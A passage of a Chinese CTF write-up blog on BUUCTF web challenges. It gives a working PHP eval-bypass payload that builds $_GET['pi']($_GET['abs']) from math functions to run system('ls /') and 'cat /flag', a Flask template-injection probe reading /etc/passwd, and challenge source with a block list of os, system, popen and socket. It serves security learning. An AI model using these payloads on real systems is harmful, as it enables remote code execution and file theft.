        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dechex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">//帮你算出答案</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<pre class="line-numbers language-none"><code class="language-none">base_convert(37907361743, 10, 36)
base_convert 是 PHP 中的一个函数，其作用是将一个数字从一种进制转换为另一种进制。这里 base_convert(37907361743, 10, 36) 表示把十进制数 37907361743 转换为 36 进制的数，最终得到 "hex2bin"。在 36 进制里，使用的字符集是 0 - 9 和 a - z。
2. dechex(1598506324)
dechex 函数的功能是把十进制数转换为十六进制数。dechex(1598506324) 会将十进制数 1598506324 转换为十六进制，结果是 "5f474554"。
3. $pi = hex2bin("5f474554")
hex2bin 函数的作用是把十六进制字符串转换为二进制字符串。hex2bin("5f474554") 会将十六进制字符串 "5f474554" 转换为对应的二进制字符串，实际上得到的是 "_GET"，然后将其赋值给变量 $pi。
4. ($$pi){pi}(($$pi){abs})
在 PHP 中，$$ 是可变变量的语法。可变变量允许你动态地设置和使用变量名。因为 $pi 的值是 "_GET"，所以 $$pi 就等同于 $_GET。
{} 在某些情况下可以替代 [] 来访问数组元素。所以 ($$pi){pi} 就相当于 $_GET['pi']，($$pi){abs} 相当于 $_GET['abs']。
整体 ($$pi){pi}(($$pi){abs}) 实际上就是执行 $_GET['pi']($_GET['abs'])，也就是调用通过 GET 请求传递进来的 pi 参数所代表的函数，并且将 GET 请求传递进来的 abs 参数作为该函数的参数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote>
<pre class="line-numbers language-none"><code class="language-none">hex2bin("5f474554")
=&gt;base_convert(37907361743, 10, 36)(dechex(1598506324))=$pi
system("ls /")
=&gt;($$pi){tan}(($$pi){sin})
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){sin})&amp;pi=system&amp;sin=ls /
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){sin})&amp;pi=system&amp;sin=cat /flag
flag{d0162c99-47e5-4483-9828-1feeae7b7fc6}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4efde3cec38bc6320055270b9552902a.png"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35782055/article/details/129126825">关于ctf中flask算pin总结_ctf:flask-CSDN博客</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1feb6d1e2469a6a3171a1f004e7e524f.png"></p>
<pre class="line-numbers language-none"><code class="language-none">{{7*7}}-&gt;no
{{7+7}}-&gt;14
试了试，popen，*不能

open('/etc/passwd/')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>给chef美化一下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for
<span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm
<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span> SubmitField
<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> DataRequired
<span class="token keyword">from</span> flask_bootstrap <span class="token keyword">import</span> Bootstrap
<span class="token keyword">import</span> base64

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'s_e_c_r_e_t_k_e_y'</span>
bootstrap <span class="token operator">=</span> Bootstrap<span class="token punctuation">(</span>app<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">NameForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>
    text <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'BASE64加密'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'提交'</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">NameForm1</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>
    text <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'BASE64解密'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'提交'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>str_val<span class="token punctuation">)</span><span class="token punctuation">:</span>
    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"popen"</span><span class="token punctuation">,</span> <span class="token string">"import"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"chr"</span><span class="token punctuation">,</span> <span class="token string">"request"</span><span class="token punctuation">,</span> <span class="token string">"subprocess"</span><span class="token punctuation">,</span> <span class="token string">"commands"</span><span class="token punctuation">,</span> <span class="token string">"socket"</span><span class="token punctuation">,</span>
                  <span class="token string">"hex"</span><span class="token punctuation">,</span> <span class="token string">"base64"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>
        <span class="token keyword">if</span> x <span class="token keyword">in</span> str_val<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token number">0</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hint'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    txt <span class="token operator">=</span> <span class="token string">"失败乃成功之母！！"</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"hint.html"</span><span class="token punctuation">,</span> txt<span class="token operator">=</span>txt<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>
        text_encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        tmp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"结果 :</span><span class="token interpolation"><span class="token punctuation">{</span>text_encoded<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
        flash<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'encode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        form <span class="token operator">=</span> NameForm<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"加密"</span><span class="token punctuation">,</span> img<span class="token operator">=</span><span class="token string">"flask.png"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/decode'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            text_decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            tmp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"结果 ： </span><span class="token interpolation"><span class="token punctuation">{</span>text_decoded<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
            <span class="token keyword">if</span> waf<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>
                flash<span class="token punctuation">(</span><span class="token string">"no no no !!"</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            flash<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
        <span class="token keyword">except</span> base64<span class="token punctuation">.</span>binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">"输入的不是有效的 Base64 编码字符串"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        form <span class="token operator">=</span> NameForm1<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"解密"</span><span class="token punctuation">,</span> img<span class="token operator">=</span><span class="token string">"flask1.png"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/&lt;name&gt;'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">not_found</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"404.html"</span><span class="token punctuation">,</span> name<span class="token operator">=</span>name<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://lingqing777.github.io/2025/01/25/di-yi-ye/">https://lingqing777.github.io/2025/01/25/di-yi-ye/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">q1n9</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/ctf/">
                                    <span class="chip bg-color">ctf</span>
                                </a>
                            
                                <a href="/tags/wp/">
                                    <span class="chip bg-color">wp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2025/01/30/zuo-ye/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="其他题1（队）">
                        
                        <span class="card-title">其他题1（队）</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-30
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                    网安
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                    <a href="/tags/wp/">
                        <span class="chip bg-color">wp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                本篇&nbsp;<i class="far fa-dot-circle"></i>
            </div>
            <div class="card">
                <a href="/2025/01/25/di-yi-ye/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="buuctf">
                        
                        <span class="card-title">buuctf</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-25
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                    网安
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                    <a href="/tags/wp/">
                        <span class="chip bg-color">wp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2025</span>
            
            <a href="/about" target="_blank">q1n9</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">159.7k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
